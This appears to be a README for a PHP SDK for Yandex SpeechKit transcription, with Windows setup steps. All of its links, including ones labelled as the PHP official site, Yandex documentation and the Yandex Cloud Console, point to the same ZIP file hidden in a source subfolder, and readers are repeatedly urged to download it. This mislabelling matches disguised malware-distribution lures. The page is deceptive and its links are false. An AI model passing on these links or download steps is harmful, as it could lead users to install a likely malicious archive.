# 🎙️ yandex-speechkit-php - Easy Speech Transcription for PHP

[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-brightgreen)](https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip)

---

## 📋 About yandex-speechkit-php

This application works as a bridge to Yandex SpeechKit API using PHP. It helps convert long audio files into text. You can use it to transcribe audio up to 4 hours or 1 GB in size. The software recognizes different speakers, cleans up the text, and filters out bad words. It supports popular audio formats like WAV, OGG_OPUS, MP3, and raw PCM.

If you use Laravel, the SDK integrates smoothly with it by adding Facade and Service Provider support. The software automatically handles authorization by using IAM tokens from Yandex Cloud.

---

## 💻 System Requirements

Before getting started, check that your Windows PC meets these needs:

- Windows 10 or newer (64-bit recommended)
- PHP version 7.4 or higher installed
- Internet connection for accessing Yandex SpeechKit API
- At least 4 GB of RAM for processing longer audio files
- Around 500 MB of free disk space for installation and temp files

---

## 🌐 Topics Covered

This app deals with the following areas:

- Speech-to-text technology
- PHP programming language
- API integration with Yandex Cloud services
- Support for Laravel framework
- Audio file formats and processing
- Speaker recognition and text normalization

---

## 🚀 Getting Started: Download and Install

### Step 1: Download the software

Click the green button below or visit the main page to download:

[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-blue)](https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip)

The link takes you to the GitHub repository where you can find the latest release files and instructions.

### Step 2: Install PHP on your PC

If you do not have PHP installed:

- Visit https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
- Choose the latest version compatible with your system (x64 Non Thread Safe recommended)
- Download and run the installer
- Follow on-screen prompts to complete the installation

Make sure the PHP folder path is added to your system’s PATH variable:

- Open Settings > System > About > Advanced system settings
- Click Environment Variables
- Find and edit the PATH variable in "System variables"
- Add the folder path where PHP is installed, e.g., `C:\php`
- Click OK to save

### Step 3: Download and unzip yandex-speechkit-php

- Download the project ZIP file from the repository (look for the green “Code” button, then select "Download ZIP")
- Extract the folder anywhere accessible, for example, `C:\yandex-speechkit-php`

---

## ⚙️ Setting Up the Application on Windows

### Step 4: Prepare your Yandex Cloud account and IAM token

You need an IAM token to let the app use Yandex SpeechKit API:

- Go to https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
- Create or sign in to your Yandex Cloud account
- In the console, create a new service account
- Grant permissions to use the SpeechKit API
- Generate an IAM token for the service account
- Copy and save the token securely

### Step 5: Configure the app

Open the configuration file inside the extracted folder. It might be named `config.php` or something similar.

- Find the section that asks for your IAM token
- Paste the token here as a string
- Save the file

If no config file exists, create one with this simple format:

```php
<?php
return [
    'iam_token' => 'YOUR_IAM_TOKEN_HERE',
];
```

Save it as `config.php` in the main folder.

### Step 6: Prepare your audio files

Place the audio files you want to transcribe in a known folder on your PC.

Supported formats are:

- WAV
- OGG_OPUS
- MP3
- raw PCM

Make sure each audio file is under 1 GB and less than 4 hours long.

---

## ▶️ How to Run the Transcription

### Step 7: Open Command Prompt

- Press `Win + R`, type `cmd`, and hit Enter

### Step 8: Navigate to the app folder

In the Command Prompt window, type:

```
cd C:\yandex-speechkit-php
```

(Adjust this path if you unzipped the app somewhere else.)

### Step 9: Run the PHP script

The command you run will depend on the specific script it offers. Usually, it looks like this:

```
php transcribe.php path\to\your\audiofile.wav
```

Replace `path\to\your\audiofile.wav` with your actual audio file’s path.

You should see the app start processing the file. When done, it will output the transcript text in the console or save it to a file.

---

## 🔧 Troubleshooting Tips

- Make sure PHP runs by typing `php -v` in Command Prompt. It should show the version number.
- Check your IAM token to confirm it is valid and not expired.
- Confirm your internet connection is active.
- Use supported audio file types and size limits.
- If you get errors about missing dependencies or files, make sure you extracted all files properly.
- Run Command Prompt as administrator if you face access or permission issues.

---

## 🔄 Updating the Application

To update:

- Visit the project page: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
- Download the latest ZIP release
- Replace your existing files with the new ones
- Keep your `config.php` to avoid losing IAM token settings

---

## 🧰 Additional Resources

Visit these pages for more help and references:

- Yandex SpeechKit API Docs: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
- PHP official site: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
- Yandex Cloud Console: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip

---

## 📥 Download Link (Again)

Download or visit the repository here:

[Get yandex-speechkit-php](https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip)